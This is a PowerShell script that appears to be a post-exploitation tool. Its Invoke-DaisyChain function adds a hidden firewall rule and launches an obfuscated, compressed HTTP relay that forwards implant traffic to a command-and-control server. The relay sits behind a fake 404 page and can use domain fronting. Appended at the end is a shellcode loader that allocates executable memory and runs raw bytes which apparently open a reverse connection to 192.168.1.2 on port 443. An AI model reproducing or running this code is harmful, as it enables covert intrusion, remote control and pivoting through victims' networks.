
$firewallName = ""
$serverPort = ""
function Invoke-DaisyChain {

param(
[Parameter(Mandatory=$true)][string]$port, 
[Parameter(Mandatory=$true)][string]$daisyserver,
[Parameter(Mandatory=$true)][string]$c2server, 
[Parameter(Mandatory=$true)][string]$c2port,
[Parameter(Mandatory=$true)][string]$URLs,
[Parameter(Mandatory=$false)][switch]$Localhost,
[Parameter(Mandatory=$false)][switch]$NoFWRule,
[Parameter(Mandatory=$false)][AllowEmptyString()][string]$domfront, 
[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxyurl, 
[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxyuser, 
[Parameter(Mandatory=$false)][AllowEmptyString()][string]$proxypassword
)
$fw = Get-FirewallName -Length 15
$script:firewallName = $fw
$firewallName = $fw 

if ($Localhost.IsPresent){
echo "[+] Using localhost parameter"
$HTTPServer = "localhost"
$daisyserver = "http://localhost"
$NoFWRule = $true
} else {
$HTTPServer = "+"
}

$script:serverPort = $port
if ($NoFWRule.IsPresent) {
    $fwcmd = "echo `"No firewall rule added`""
}else {
    echo "Adding firewall rule name: $firewallName for TCP port $port"
    echo "Netsh.exe advfirewall firewall add rule name=`"$firewallName`" dir=in action=allow protocol=TCP localport=$port enable=yes"
    $fwcmd = "Netsh.exe advfirewall firewall add rule name=`"$firewallName`" dir=in action=allow protocol=TCP localport=$port enable=yes"
}

$fdsf = @"
`$username = "$proxyuser"
`$password = "$proxypassword"
`$proxyurl = "$proxyurl"
`$domainfrontheader = "$domfront"
`$serverport = '$port'
`$Server = "${c2server}:${c2port}"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
function Get-Webclient (`$Cookie) {
`$username = `$username
`$password = `$password
`$proxyurl = `$proxyurl
`$wc = New-Object System.Net.WebClient;  
`$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko")
`$wc.Headers.Add("Referer","")
`$h=`$domainfrontheader
if (`$h) {`$wc.Headers.Add("Host",`$h)}
if (`$proxyurl) {
`$wp = New-Object System.Net.WebProxy(`$proxyurl,`$true); 
`$wc.Proxy = `$wp;
}
if (`$username -and `$password) {
`$PSS = ConvertTo-SecureString `$password -AsPlainText -Force; 
`$getcreds = new-object system.management.automation.PSCredential `$username,`$PSS; 
`$wp.Credentials = `$getcreds;
} else {
`$wc.UseDefaultCredentials = `$true; 
}
if (`$cookie) {
`$wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=`$Cookie")
}
`$wc
}
`$httpresponse = '
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL/s was not found on this server.</p>
<hr>
<address>Apache (Debian) Server</address>
</body></html>
'
`$URLS = $($URLS)
`$listener = New-Object -TypeName System.Net.HttpListener 
`$listener.Prefixes.Add("http://$($HTTPServer):`$serverport/") 
`$listener.Start()
echo "started http server"
while (`$listener.IsListening) 
{
    if (`$kill.log -eq 2) {`$listener.Stop();exit}
    `$message = `$null
    `$context = `$listener.GetContext() 
    `$request = `$context.Request
    `$response = `$context.Response       
    `$url = `$request.RawUrl
    `$newurl = `$url -replace "\?", ""
    `$method = `$request.HttpMethod
    if (`$null -ne (`$URLS | ? { `$newurl -match `$_ }) ) {
        `$cookiesin = `$request.Cookies -replace 'SessionID=', ''
        `$responseStream = `$request.InputStream 
        `$targetStream = New-Object -TypeName System.IO.MemoryStream 
        `$buffer = new-object byte[] 10KB 
        `$count = `$responseStream.Read(`$buffer,0,`$buffer.length) 
        `$downloadedBytes = `$count 
        while (`$count -gt 0) 
        { 
            `$targetStream.Write(`$buffer, 0, `$count) 
            `$count = `$responseStream.Read(`$buffer,0,`$buffer.length) 
            `$downloadedBytes = `$downloadedBytes + `$count 
        } 
        `$len = `$targetStream.length
        `$size = `$len + 1
        `$size2 = `$len -1
        `$buffer = New-Object byte[] `$size
        `$targetStream.Position = 0
        `$targetStream.Read(`$buffer, 0, `$targetStream.Length)|Out-null
        `$buffer = `$buffer[0..`$size2]
        `$targetStream.Flush()
        `$targetStream.Close() 
        `$targetStream.Dispose()
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
        if (`$method -eq "GET") {
        `$message = (Get-Webclient -Cookie `$cookiesin).DownloadString("`$(`$Server)`$(`$url)")
        }
        if (`$method -eq "POST") {
        `$message = (Get-Webclient -Cookie `$cookiesin).UploadData("`$(`$Server)`$(`$url)", `$buffer)
        }
    }
    if (!`$message) {
        `$message = `$httpresponse
        echo `$request
    }
    [byte[]] `$buffer = [System.Text.Encoding]::UTF8.GetBytes(`$message)
    `$response.ContentLength64 = `$buffer.length
    `$response.StatusCode = 200
    `$response.Headers.Add("CacheControl", "no-cache, no-store, must-revalidate")
    `$response.Headers.Add("Pragma", "no-cache")
    `$response.Headers.Add("Expires", 0)
    `$output = `$response.OutputStream
    `$output.Write(`$buffer, 0, `$buffer.length)
    `$output.Close()
    `$message = `$null
}
`$listener.Stop()
"@

$ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($fdsf)
$CompressedStream = New-Object IO.MemoryStream
$DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
$DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
$DeflateStream.Dispose()
$CompressedScriptBytes = $CompressedStream.ToArray()
$CompressedStream.Dispose()
$EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
$NewScript = 'sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(' + "'$EncodedCompressedScript'" + '),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()'

$t = Invoke-Netstat| ? {$_.ListeningPort -eq $port}
$global:kill = [HashTable]::Synchronized(@{})
$kill.log = "1"

$fwcmd|iex

if (!$t) { 
    if (Test-Administrator) { 
        $Runspace = [RunspaceFactory]::CreateRunspace()
        $Runspace.Open()
        $Runspace.SessionStateProxy.SetVariable('Kill',$Kill)
        $Jobs = @()
        $Job = [powershell]::Create().AddScript($NewScript)
        $Job.Runspace = $Runspace
        $Job.BeginInvoke() | Out-Null
        echo ""
        echo "[+] Running DaisyServer as Administrator:"
    } else { 
        $Runspace = [RunspaceFactory]::CreateRunspace()
        $Runspace.Open()
        $Runspace.SessionStateProxy.SetVariable('Kill',$Kill)
        $Jobs = @()
        $Job = [powershell]::Create().AddScript($NewScript)
        $Job.Runspace = $Runspace
        $Job.BeginInvoke() | Out-Null 
        echo ""
        echo "[+] Running DaisyServer as Standard User, must use -localhost flag for this to work:"
    }  

    echo "[+] To stop the Daisy Server, Stop-Daisy current process"
}

}
function Stop-Daisy {
$kill.log = 2
Netsh.exe advfirewall firewall del rule name="$firewallName"
(new-object system.net.webclient).downloadstring("http://localhost:$serverPort")
}
function Get-FirewallName 
{
param (
    [int]$Length
)
$set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
$result = ''
for ($x = 0; $x -lt $Length; $x++) 
{
    $result += $set | Get-Random
}
return $result
}
Function Invoke-Netstat {                       
try {            
    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()            
    $Connections = $TCPProperties.GetActiveTcpListeners()            
    foreach($Connection in $Connections) {            
        if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }
        $OutputObj = New-Object -TypeName PSobject            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "LocalAddress" -Value $connection.Address            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "ListeningPort" -Value $Connection.Port            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "IPV4Or6" -Value $IPType            
        $OutputObj            
    }            
            
} catch {            
    Write-Error "Failed to get listening connections. $_"            
}
}
function Test-Administrator  
{  
    $user = [Security.Principal.WindowsIdentity]::GetCurrent();
    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
}


$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x02,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

